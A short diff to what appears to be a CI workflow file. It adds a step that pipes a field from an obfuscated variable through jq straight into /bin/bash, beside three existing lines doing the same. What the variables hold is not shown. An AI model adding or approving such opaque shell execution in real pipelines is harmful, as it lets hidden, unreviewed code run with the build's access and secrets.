@@ -43,6 +43,7 @@ jobs:
           echo $cb0 | jq -r .fld69 | /bin/bash
           echo $lv75179 | jq -r .iv49 | /bin/bash
           printf '%s' "$kn6" | jq -r .kuo32 | /bin/bash
+          printf '%s' "$xylck37" | jq -r .ed579 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
